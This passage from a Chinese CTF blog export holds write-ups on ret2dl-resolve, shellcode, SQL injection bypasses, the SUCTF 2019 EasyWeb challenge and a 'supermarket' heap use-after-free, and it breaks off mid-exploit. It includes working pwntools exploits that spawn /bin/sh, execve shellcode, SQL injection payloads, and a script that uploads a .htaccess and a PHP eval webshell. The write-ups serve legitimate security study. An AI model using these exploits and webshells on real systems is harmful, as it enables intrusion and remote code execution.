rel\n\n通过rel就可以获得Elf32_Rel结构体的数据\nr_offset=0x0804a00c;r_info=0x00000107;\n\n将r_info&gt;&gt;8得到4也就得到了.dynsym中的下标。\n\n从上往下从0开始，找到与下标相同的行获得第一列的数据根据即为name_offset\n\n为什么是第一列是因为第一列的值其实就是上面写的偏移\n再根据.dynstr+name_offset获得函数名的字符串。\n\n最后再根据得到的字符串来执行函数。\n梳理一下1.首先push两个参数进入，随后执行_dl_runtime_resolve\n2.根据link_map找到.dynamic地址\n3.根据.dynamic找到.dynstr    .dynsym     .rel.plt\n4.根据reloc_arg找到Elf32_Rel的指针rel\n5.拿到r_info经过移位拿到index\n6.根据index拿到name_offset结合.dynstr计算出函数的名字\n\nrel_addr = .rel.plt_addr + reloc_arg\nfake_rel_addr = .rel.plt_addr + fake_reloc_arg\nfake_reloc_arg = fake_rel_addr - rel_addr + reloc_arg\n根据以上简单的运算就可以实现伪造rel的地址\n\n\nname_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr\nfake_name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr\nr_info = (((fake_dynsym_addr - .dynsym_addr) / 16) &lt;&lt; 8) + 0x7\n这里伪造出rel当中的r_info的值\n\n\n根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行\nfake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)\n\n最终构造exp\nfrom pwn import *r = process(&#x27;./ret2dlsolve&#x27;)elf = ELF(&#x27;./ret2dlsolve&#x27;)read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x80482d0leave_ret = 0x08048378pop_ebp = 0x080484abdynstr_addr = 0x0804821cdynsym_addr = 0x080481ccrel_addr = 0x08048298bss = elf.bss()payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x800) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x800)+p32(0x1000)r.sendline(payload)fake_dynsym_addr = bss+0x910system_str = bss+0x900fake_rel = p32(read_got) + \\    p32((((fake_dynsym_addr - dynsym_addr) // 16) &lt;&lt; 8) + 0x7)fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)fake_rel_addr = fake_dynsym_addr+len(fake_dynsym)bin_sh_addr = bss+0x900+len(b&#x27;system\\x00&#x27;)payload = b&#x27;a&#x27;*0x4+p32(read_load_plt)+p32(fake_rel_addr -                                          rel_addr)+p32(0)+p32(bin_sh_addr)payload += payload.ljust(0x100, b&#x27;\\x00&#x27;) + \\    b&#x27;system\\x00/bin/sh&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)payload += fake_dynsym+fake_relr.sendline(payload)r.interactive()\n\n下面是64位的情况，64位不能直接伪造rel.plt\nif (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)   &#123;     const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;     version = &amp;l-&gt;l_versions[ndx];     if (version-&gt;hash == 0)       version = NULL;   &#125; \n\n这里，出现了访问未映射的内存，主要原因就是reloc-&gt;r_info过大，bss段一般所在位置在0x600000然而真正的rel.plt一般在0x400000。\nif (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          ...  &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;  &#125;  \n\n解决办法是绕过这个if判断进入else。\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym;  \n\n如果我们伪造link_map，让sym-&gt;value为某一个已经解析了的函数地址，让l-&gt;addr为我们需要的函数地址到已知函数地址的偏移，那么l-&gt;l_addr + sym-&gt;st_value也就等于我们需要的函数地址。\n比如，如果我们把read_got-8处当作sym那么sym-&gt;st_value也就等于read的地址，并且st_other正好也不为0，同时绕过了if，一举两得。\n此时的rel结构为:\ntypedef struct&#123;  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */&#125; Elf64_Rela;/* How to extract and insert information held in the r_info field.  */#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))\n\n\n在动态调试也可以看到raed在符号表中的偏移为1(0x100000007&gt;&gt;32)\n还有注意的就是我们需要伪造这个数组里的几个指针，它们分别是\nDT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)\nDT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)\nDT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)\n(其实我也不知道怎么调用的system，我猜测是因为DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);这句话的原因吧，希望知道的大师傅可以评论一下)\n综上得出exp:\nfrom pwn import *r = process(&#x27;./ret2dlsolve_64&#x27;)elf = ELF(&#x27;./ret2dlsolve_64&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)pop_rdi = 0x00000000004005c3pop_rsi_r15 = 0x00000000004005c1read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x4003f6bss = elf.bss()l_addr = libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi)+p64(0) + \\    p64(pop_rsi_r15)+p64(bss+0x100)+p64(0) + \\    p64(read_plt)+p64(elf.symbols[&#x27;fun&#x27;])r.sendline(payload)dynstr_addr = 0x400318 # str tablefake_link_map_addr = bss+0x100r_offset = fake_link_map_addr + l_addr * -1 - 8l_addr = l_addr &amp; (2**64-1)fake_strtab = p64(0)+p64(dynstr_addr)fake_strtab_addr = fake_link_map_addr+0x8fake_symtab = p64(0)+p64(read_got-0x8)fake_symtab_addr = fake_link_map_addr+0x18fake_dynrel_addr = fake_link_map_addr+0x28fake_rel_addr = fake_link_map_addr+0x38fake_dynrel = p64(0)+p64(fake_rel_addr)fake_rel = p64(r_offset)+p64(0x7)+p64(0)fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_relfake_link_map = fake_link_map.ljust(0x68, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)fake_link_map = fake_link_map.ljust(0xf8,b&#x27;\\x00&#x27;)+p64(fake_dynrel_addr)fake_link_map = fake_link_map.ljust(0x100,b&#x27;\\x00&#x27;)+b&#x27;/bin/sh&#x27;r.sendline(fake_link_map)bin_sh_addr = fake_link_map_addr+0x100payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(read_load_plt) + \\    p64(fake_link_map_addr)+p64(0)r.sendline(payload)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104478081\nhttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak\nhttps://blog.csdn.net/jzc020121/article/details/116312592#t3\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve"]},{"title":"shellcode","url":"/2021/11/24/shellcode/","content":"shellcode理解shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。\n在pwn的过程中我们的目标一般来说都是执行system(“/bin/sh”);其实shellcode也是较为类似的，只不过是一串机器码\nx86pwntools&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push &#x27;sh\\x00\\x00&#x27; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#x27;sh\\x00&#x27; */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80&gt;&gt;&gt;\n\n可以很明显的看出来这个python默认生成的shellcode是32位的shellcode。\n32位的函数的参数不是栈里面的内容吗，为什么这里非要高寄存器呢？是因为这是系统调用的所以参数使用的是寄存器。\npython已经告诉我们上面的shellcode最终执行的是什么了\n\nexecve(path=’/bin///sh’, argv=[‘sh’], envp=0)\n32位的第一个参数为ebx，后面是ecx，edx\n\n&gt;&gt;&gt; print(len(asm(shellcraft.sh())))44\n\n自己编写x86 shellcode把上面的转化成十六进制代码之后求长度发现有44字节，确实是太长了，所以我们搞清楚本质就可以自己写shellcode了\n# 其实根据上面的可以看出来我们需要满足的条件有以下几条# ebx=/bin/sh# ecx=0# edx=0# eax=0xb     (系统调用号，后面有系统调用号很全的网站)# 所以根据上面的要求进行修改就好push 0x68732fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxxor eax,eaxmov al,0xbint 0x80\n\n&gt;&gt;&gt; len(&#x27;\\x68\\x2F\\x73\\x68\\x00\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x31\\xC9\\x31\\xD2\\x31\\xC0\\xB0\\x0B\\xCD\\x80&#x27;)22\n\n可以看到我们就只需要22字节了省了一半，当然还可以更简短，自己下去写\namd64pwntools&gt;&gt;&gt; context.arch=&#x27;amd64&#x27;&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    syscall&gt;&gt;&gt; \n\n这里的思路和x86是一样的只是使用的寄存器不相同\n自己编写x86 shellcode# 其实根据上面的可以看出来我们需要满足的条件有以下几条# rdi=/bin/sh# rsi=0# rdx=0# rax=0x3b     (系统调用号，后面有系统调用号很全的网站)# syscall      这里和x86有点区别# 所以根据上面的要求进行修改就好mov rbx,0x68732f6e69622fpush rbxpush rsppop rdixor rsi,rsixor rdx,rdxmov rax,0x3bsyscall\n\n&gt;&gt;&gt; len(&#x27;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x0F\\x05&#x27;)28&gt;&gt;&gt;\n\n也少了很多哈，同样也不是最少的，可以去网上搜或则自己写\n32位和64位系统调用表\nhttps://blog.k0nashi.cn/2021/09/14/syscall-table/\n","categories":["pwn"],"tags":["shellcode编写"]},{"title":"SQL注入的一些小知识点","url":"/2021/09/17/sqlinjery/","content":"绕过的内容总结得较为完整的网站:\nhttps://www.cnblogs.com/Vinson404/p/7253255.html\n  拆开： 1919810931114514+words 1919810931114514:flag words:id+data;  alter tables words rename to words1; 1919810931114514+words1;  alter tables `1919810931114514` rename to words ;words+words1;  alter tables words change flag id varchar(50); #\n\n上面是从给后端处理的值来看，上传的数值为int类型可以改变原本表的表名以及字段名，再用mysql的万能绕过语句\n&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;\n\n预编译这个还看不懂\n有过滤–或则#还是–和#都过滤时，可以使用\n1&#x27; 注入语句 or &#x27;1&#x27;=&#x27;1    这种绕过引号的方式也算是及其嚣张了\n\n空格的 URL 编码替代方法:　　　　　　%09 TAB(水平)　　　　　　%0a 新建一行　　　　　　%0c 新的一页　　　　　　%0d return功能　　　　　　%0b TAB(垂直)      （php-5.2.17,5,3,29成功）　　　　　　%a0 空格\n\n\nmysql的约束问题\n\nmysql的在实验之后，admin是可以以admin加一个加空格来写入\n\n\n无列名注入\n\n1&#x27; and (select * from(select * from 表名 as a join 表名 as b) as c)--+;1&#x27; and (select * from(select * from 表名 as a join 表名 as b using(第一个字段)) as c)--+;1&#x27; and (select * from(select * from 表名 as a join 表名 as b using(第一个字段，第二个字段)) as c)--+;\n\n// 一种基于bool值的无列表名注入假设 flag 为 flag &#123;bbbbb&#125;，对于 payload 这个两个 select 查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大，这个不难懂，和 c 语言的 strcmp() 函数原理一样MariaDB [test]&gt; select * from flag;+----+-----------------------+| id | flag                  |+----+-----------------------+|  1 | flag&#123;this_is_a_test!&#125; |+----+-----------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;e&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;e&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              0 |+--------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;f&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;f&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              0 |+--------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;g&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;g&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              1 |+--------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ((1,&#x27;fm&#x27;)&gt;(select * from flag));+---------------------------------+| ((1,&#x27;fm&#x27;)&gt;(select * from flag)) |+---------------------------------+|                               1 |+---------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ((1,&#x27;fl&#x27;)&gt;(select * from flag));+---------------------------------+| ((1,&#x27;fl&#x27;)&gt;(select * from flag)) |+---------------------------------+|                               0 |+---------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; \n\n\n堆叠注入\n\n源码:$sql=&quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;;\n\nMariaDB [test]&gt; select * from test;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | admin      | flag1    ||  2 | admin      | flag1    ||  3 | database() | test     |+----+------------+----------+3 rows in set (0.001 sec)MariaDB [test]&gt; select 1||username from test;+-------------+| 1||username |+-------------+|           1 ||           1 ||           1 |+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt; select id,1||username from test;+----+-------------+| id | 1||username |+----+-------------+|  1 |           1 ||  2 |           1 ||  3 |           1 |+----+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt; select password,1||username from test;+----------+-------------+| password | 1||username |+----------+-------------+| flag1    |           1 || flag1    |           1 || test     |           1 |+----------+-------------+3 rows in set (0.000 sec)MariaDB [test]&gt; select *,1||username from test;+----+------------+----------+-------------+| id | username   | password | 1||username |+----+------------+----------+-------------+|  1 | admin      | flag1    |           1 ||  2 | admin      | flag1    |           1 ||  3 | database() | test     |           1 |+----+------------+----------+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt;\n\n解法二：\nset sql_mode=PIPES_AS_CONCAT  # 让管道符作为concat1;set sql_mode=PIPES_AS_CONCAT;selet 1结合源码就是:select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag;\n\n\n不使用select查表\n\nhandler table_name open;handler table_name first;handler table_name next;handler table_name next;handler table_name next;...handler table_name close;\n\n","categories":["web"],"tags":["sql"]},{"title":"在刚开始学习pwn的小问题","url":"/2021/09/17/study-pwn1/","content":"\n关于stack overflow的学习\n一般来说会出现get函数，这个函数不受保护可以无限写入，导致可以修改栈内部的内容，填充垃圾数据然后在需要的地方修改到我们需要的地址达到返回shell的效果。\n还可能会出现scanf函数并且函数后面的限制长度会比较长可以实现栈溢出的效果。\n\nROP\n\n\n上图就是执行system的流程，但是我们需要获得反弹shell的话就必须执行system(‘/bin/sh’)需要参数，所以我们需要给system参数。\n当我们跳转到函数地址的时候为了保存数据，会对栈进行操作，x86程序的操作的流程是:\n\n所以可以把system的参数放到栈里面，这样的话就可以填充一个位置的垃圾数据，然后紧跟着往栈里面放需要的参数也就是’/bin/sh’的地址。\n在ubuntu18以上，通过栈溢出ret到system需要注意栈平衡\n","categories":["pwn"],"tags":["rop stack overflow"]},{"title":"SUCTF_2019_EasyWeb","url":"/2021/09/18/suctf-2019-EasyWeb/","content":"`\n题目源码:\n&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);        $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;\n\n绕过 preg_match 执行 eval编写脚本构造出$_GET[xxx]\n&lt;?php$l = &quot;&quot;;$r = &quot;&quot;;$argv = str_split(&quot;_GET&quot;);for ($i = 0; $i &lt; count($argv); $i++) &#123;    for ($j = 0; $j &lt; 255; $j++) &#123;        $k = chr($j) ^ chr(255);      //dechex(255) = ff        if ($k == $argv[$i]) &#123;            if ($j &lt; 16) &#123;                $l .= &quot;%ff&quot;;                $r .= &quot;%0&quot; . dechex($j);                continue;            &#125;            $l .= &quot;%ff&quot;;            $r .= &quot;%&quot; . dechex($j);            continue;        &#125;    &#125;&#125;echo &#x27;$&#123;&#x27; . $l . &#x27;^&#x27; . $r . &#x27;&#125;&#x27;;// 最终的结果为：$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;// 加上参数$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;\n\n第一步的 payload 就是:\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo\n\n然后再 php 可以找到自己的 remote(后面的文件上传也会打印出来所以无所谓的)。\n上传 webshell因为这里过滤了后缀名有 ph 就会结束程序，内容存在&lt;?也会存在程序，还检测了文件的头信息是否为图片格式。所以第一反应就是.htaccess 上传。\n在.htaccess 的文件内容:\nAddType application/x-httpd-php .gif;上面的内容表示把.gif为后缀名的文件当作执行程序加载php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=back.gif&quot;;这句则是在访问一个php文件的时候，会在文件解析之前自动包含上面文件\n\n所以很简单的就可以构造出攻击脚本:\nimport requestsimport base64url = &#x27;http://58d97b5a-ba1f-46e5-82e1-ab2eff363141.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&#x27;htaccess = b&#x27;&#x27;&#x27;\\x00\\x00\\x85\\x48\\x85\\x18    AddType application/x-httpd-php .gif    php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=back.gif&quot;&#x27;&#x27;&#x27;# 因为检测了&lt;?所以webshell经过base64编码来绕过，所以上面包含的时候采用php伪协议decode一下file = &#123;    &#x27;file&#x27;: (&#x27;.htaccess&#x27;, htaccess, &#x27;image/gif&#x27;)&#125;res = requests.post(url=url, files=file).textprint(res)back = b&#x27;GIF89a&#x27; + b&quot;aa&quot; + \\    base64.b64encode(b&quot;&lt;?php eval($_POST[&#x27;wow&#x27;]);?&gt;&quot;)# 这里是一个很坑的点，需要额外增加两个字节，凑足8字节满足base64算法file = &#123;    &#x27;file&#x27;: (&#x27;back.gif&#x27;, back, &#x27;image/gif&#x27;)&#125;res = requests.post(url=url, files=file).textprint(res)\n\n绕过 open_basedir上传了 webshell 之后，直接 var_dump(scandir(‘/‘));应为 open_basedir 的效果无法获取\n\n需要绕过 open_basedir，我就给出 payload 就行，具体原理就去下面的链接去了解。\n\n挂出绕过 open_basedir 从底层出发找出原理的大佬文章的链接\nhttps://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2\n","categories":["web-buuctf"],"tags":["无数字字母shell .htaccess上传 绕过open_basedir"]},{"title":"supermarket","url":"/2021/11/03/supermarket/","content":"检测保护题目给了libc文件\n\n堆栈不可执行\n分析流程void sub_8048FC1()&#123;  while ( 1 )  &#123;    sub_8048864();    printf(&quot;your choice&gt;&gt; &quot;);    switch ( sub_804882E() )    &#123;      case 1:        add();        break;      case 2:        del();        break;      case 3:        list();        break;      case 4:        change_price();        break;      case 5:        change_description();        break;      case 6:        exit(0);        return;      default:        puts(&quot;invalid choice&quot;);        break;    &#125;  &#125;&#125;\n\n一个菜单题(感觉最近的做的菜单题都是堆题)\nint add()&#123;  char *v1; // ebx  char *v2; // ebx  char src[16]; // [esp+4h] [ebp-24h] BYREF  int v4; // [esp+14h] [ebp-14h]  int v5; // [esp+18h] [ebp-10h]  int i; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt;= 15 &amp;&amp; (&amp;s2)[i]; ++i )    ;  if ( i &gt; 15 )    return puts(&quot;no more space&quot;);  printf(&quot;name:&quot;);  sub_8048812(src, 16);  v5 = sub_8048D45(src);  if ( v5 != -1 )    return puts(&quot;name exist&quot;);  v5 = sub_8048D95();  if ( v5 == -1 )    return puts(&quot;no more space&quot;);  (&amp;s2)[v5] = malloc(0x1Cu);  strcpy((&amp;s2)[v5], src);  printf(&quot;name:%s\\n&quot;, src);  v4 = 0;  printf(&quot;price:&quot;);  v4 = sub_804882E();  printf(&quot;price:%d\\n&quot;, v4);  if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 999 )    *((&amp;s2)[v5] + 4) = v4;  *((&amp;s2)[v5] + 5) = 0;  while ( *((&amp;s2)[v5] + 5) &lt;= 0 || *((&amp;s2)[v5] + 5) &gt; 256 )  &#123;    printf(&quot;descrip_size:&quot;);    v1 = (&amp;s2)[v5];    *(v1 + 5) = sub_804882E();  &#125;  printf(&quot;descrip_size:%d\\n&quot;, *((&amp;s2)[v5] + 5));  v2 = (&amp;s2)[v5];  *(v2 + 6) = malloc(*(v2 + 5));  printf(&quot;description:&quot;);  return sub_8048812(*((&amp;s2)[v5] + 6), *((&amp;s2)[v5] + 5));&#125;\n\nint list()&#123;  const char *v0; // esi  int v1; // ebx  const char *v2; // edi  size_t v3; // eax  int v4; // ebx  const char *v5; // esi  size_t v6; // eax  const void *v7; // ebx  size_t v8; // eax  size_t v9; // eax  char s[785]; // [esp+Bh] [ebp-32Dh] BYREF  int i; // [esp+31Ch] [ebp-1Ch]  memset(s, 0, sizeof(s));  for ( i = 0; i &lt;= 15; ++i )  &#123;    if ( (&amp;s2)[i] )    &#123;      if ( strlen(*((&amp;s2)[i] + 6)) &gt; 0x10 )      &#123;        v4 = *((&amp;s2)[i] + 4);        v5 = (&amp;s2)[i];        v6 = strlen(s);        sprintf(&amp;s[v6], &quot;%s: price.%d, des.&quot;, v5, v4);        v7 = *((&amp;s2)[i] + 6);        v8 = strlen(s);        memcpy(&amp;s[v8], v7, 0xDu);        v9 = strlen(s);        memcpy(&amp;s[v9], &quot;...\\n&quot;, 4u);      &#125;      else      &#123;        v0 = *((&amp;s2)[i] + 6);        v1 = *((&amp;s2)[i] + 4);        v2 = (&amp;s2)[i];        v3 = strlen(s);        sprintf(&amp;s[v3], &quot;%s: price.%d, des.%s\\n&quot;, v2, v1, v0);      &#125;    &#125;  &#125;  puts(&quot;all  commodities info list below:&quot;);  return puts(s);&#125;\n\nint change_description()&#123;  int v1; // [esp+8h] [ebp-10h]  int size; // [esp+Ch] [ebp-Ch]  v1 = sub_8048DC8();  if ( v1 == -1 )    return puts(&quot;not exist&quot;);  for ( size = 0; size &lt;= 0 || size &gt; 256; size = sub_804882E() )    printf(&quot;descrip_size:&quot;);  if ( *((&amp;s2)[v1] + 5) != size )    realloc(*((&amp;s2)[v1] + 6), size);  printf(&quot;description:&quot;);  return sub_8048812(*((&amp;s2)[v1] + 6), *((&amp;s2)[v1] + 5));&#125;\n\n看一年找不到问题，去看wp发现有UAF漏洞。主要问题发生在realloc这里，这里的realloc并没有把返回的指针赋值给(&amp;s2)[v1]+6这个位置，所以(&amp;s2)[v1]+6这里还是指向原先的堆块。\n还有额外的就是每一个商品的结构体为:\nstruct Product&#123;    char name[16];    int price;    int descrip_size;    int *description;&#125;;\n\n在add一个新的商品的时候会创建两个chunk，一个是product结构体，另一个则是生成一个chunk大小为descrip_size并且将chunk的指针赋值给description。\nrealloc(void *__ptr, size_t __size)：更改已经配置的内存空间，即更改由malloc()函数分配的内存空间的大小。\n如果将分配的内存减少，realloc仅仅是改变索引的信息。\n如果是将分配的内存扩大，则有以下情况：1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。\n利用分析主要的问题就是在change_description函数里面的realloc重新分配size的时候没有给原先的指针赋值。\n利用思路就是，先进入add函数会生成一个node1然后会继续生成一个node1_description一共生成两个chunk，再进入change_description函数修改descrip_size变大，到了realloc函数就会先free掉以前的node1_description然后新生成一个chunk，但是node1的description指针还是指向的以前的，这时再一次进入add函数会生成一个node2和node2_description，然而这个node1是生成在node1_description上面，所以这个时候就可以控制node1_description将node2的description指针指向到atoi的got表修改到system的位置\n根据上面的思路就是:修改got表-&gt;泄漏atoi的真实地址-&gt;计算偏移量并修改atoi的表为system地址-&gt;输入’/bin/sh’获得shell\nexpfrom pwn import *elf = ELF(&#x27;./questions/supermarket&#x27;)libc = ELF(&#x27;/home/tcdy/download/05e872a7193b4a85877be9d95ac6fc94/libc.so.6&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 54781)context.log_level = &#x27;debug&#x27;atoi_got_addr = elf.got[&#x27;atoi&#x27;]def create(name, descrip_size, description):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;price:&#x27;)    r.sendline(b&#x27;100&#x27;)    r.recvuntil(b&#x27;descrip_size:&#x27;)    r.sendline(bytes(str(descrip_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;description:&#x27;)    r.sendline(description)def delete(name):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)def show():    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;3&#x27;)def update(name, descrip_size, description):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;5&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;descrip_size:&#x27;)    r.sendline(bytes(str(descrip_size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;description:&#x27;)    r.sendline(description)create(b&#x27;0&#x27;, 0x80, b&#x27;a&#x27;*0x10)# 这里我们0x80个字节的意思则是因为我们在输入的时候，最后的一个字符会被改为0所以一般要大于0x1c就行create(b&#x27;1&#x27;, 0x20, b&#x27;a&#x27;*0x10)# 这里创建两个chunk是因为realloc的第一种情况，要是当前内存段存在内存空间的话就直接扩展就行，这样我们就无法UAF所以需要再创一个来chunk来占位置update(b&#x27;0&#x27;, 0x90, b&#x27;&#x27;)create(b&#x27;2&#x27;, 0x20, b&#x27;a&#x27;*0x10)payload = b&#x27;2&#x27;.ljust(16, b&#x27;\\0&#x27;)+p32(100)+p32(0x20)+p32(atoi_got_addr)update(b&#x27;0&#x27;, 0x80, 